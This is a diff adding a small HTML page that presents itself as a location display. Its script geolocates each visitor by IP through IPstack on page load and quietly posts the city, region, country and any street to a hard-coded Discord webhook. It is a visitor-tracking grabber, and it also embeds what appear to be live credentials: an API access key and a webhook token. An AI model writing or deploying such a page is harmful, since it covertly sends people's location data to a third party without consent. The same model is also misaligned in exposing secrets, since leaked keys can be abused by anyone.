@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Street-Level Location Display</title>
+</head>
+<body>
+
+<p id="locationDetails">Fetching location...</p>
+
+<script>
+    // Replace 'YOUR_IPSTACK_ACCESS_KEY' with your actual IPstack API access key
+    const ipstackAccessKey = 'aec2018fc9851eced8e0df13e01ac376';
+
+    // Use IPstack to get approximate location based on the user's IP address
+    fetch(`http://api.ipstack.com/check?access_key=${ipstackAccessKey}`)
+        .then(response => response.json())
+        .then(data => {
+            // Extract location information from the response
+            var city = data.city;
+            var region = data.region_name;
+            var country = data.country_name;
+            var street = data.street;
+
+            // Display the location details in the HTML element with id "locationDetails"
+            var locationDetails = `Location: ${city}, ${region}, ${country}.`;
+
+            // Add street information if available
+            if (street) {
+                locationDetails += ` Street: ${street}`;
+            }
+
+            document.getElementById("locationDetails").innerHTML = locationDetails;
+
+            // Send the location details to Discord webhook
+            sendToDiscordWebhook(locationDetails);
+        })
+        .catch(error => {
+            console.error('Error fetching location:', error);
+            document.getElementById("locationDetails").innerHTML = "Error fetching location.";
+        });
+
+    // Function to send a message to the Discord webhook
+    function sendToDiscordWebhook(message) {
+        // Replace 'YOUR_DISCORD_WEBHOOK_URL' with the actual URL of your Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1176560019613950063/C9xI7CjP9o3CQbhTTYzeHz8sOxxhSS1_gwaag9-cOXkQoNJ-KJ_SoXu7MQGXYIcOfj7J';
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: message,
+            }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Error sending message to Discord webhook:', error);
+        });
+    }
+</script>
+
+</body>
+</html>
